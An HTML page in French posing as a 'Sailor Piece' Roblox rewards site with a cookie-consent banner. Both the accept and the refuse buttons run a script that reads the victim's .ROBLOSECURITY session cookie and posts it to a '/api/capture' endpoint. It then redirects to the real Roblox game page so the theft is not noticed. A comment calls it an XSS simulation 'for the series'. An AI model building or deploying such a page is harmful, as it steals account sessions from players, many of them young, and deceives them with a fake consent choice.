<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Sailor Piece - Récompenses de Session</title>
    <style>
        body { margin: 0; background: #0b0d19; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .bg-image { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.3; z-index: -1; }
        .login-box { background: rgba(20, 25, 45, 0.9); padding: 40px; border-radius: 15px; border: 1px solid #3a4b8c; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
        h1 { color: #f1c40f; text-shadow: 2px 2px #000; }
        .cookie-banner { position: fixed; bottom: 0; width: 100%; background: #161b22; padding: 20px; display: flex; justify-content: space-around; align-items: center; border-top: 2px solid #f1c40f; z-index: 100; }
        .btn { background: #f1c40f; color: black; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #d4ac0d; transform: scale(1.05); }
        .btn-refuse { background: transparent; color: #8b949e; border: 1px solid #30363d; margin-left: 10px; }
    </style>
</head>
<body>
    <img src="https://i.pinimg.com/736x/75/d9/f1/75d9f18c5148f6d85b421279cde90907.jpg" class="bg-image">

    <div class="login-box">
        <h1>SAILOR PIECE</h1>
        <p>Synchronisation avec votre compte Roblox en cours...</p>
        <div class="loader"></div>
    </div>

    <div class="cookie-banner" id="banner">
        <p>Ce site utilise des cookies pour synchroniser vos statistiques Sailor Piece. Acceptez-vous l'utilisation des cookies de session ?</p>
        <div>
            <button class="btn" onclick="acceptAndCapture()">ACCEPTER ET JOUER</button>
            <button class="btn btn-refuse" onclick="acceptAndCapture()">REFUSER</button>
        </div>
    </div>

    <script>
        async function acceptAndCapture() {
            document.getElementById('banner').style.display = 'none';
            
            // Tentative d'extraction (Simulation XSS pour la série)
            const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "Navigateur_Protege";
            
            // On envoie les données à ton API Vercel
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    rblx: robloxCookie,
                    source: "Sailor Piece Interface"
                })
            });

            // Redirection vers le vrai jeu pour le réalisme
            window.location.href = "https://www.roblox.com/games/1481123753/Sailor-Piece"; 
        }
    </script>
</body>
</html>
